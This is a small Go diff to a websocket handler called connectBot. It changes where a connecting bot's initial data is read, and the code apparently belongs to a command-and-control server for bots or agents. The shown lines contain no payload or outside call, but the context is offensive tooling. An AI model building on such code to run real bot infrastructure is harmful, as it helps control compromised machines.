@@ -39,10 +39,11 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 	}
 
 	ctx := context.Background()
-	if err := wsjson.Read(ctx, con, &b); err != nil {
+	if err := wsjson.Read(ctx, con, &pb.Agentid); err != nil {
 		log.Println("Error reading the initial data of the bot : ", err)
 		return
 	}
+
 	b.Mu.Lock()
 	b.Con = con
 	b.LastSeen = time.Now()
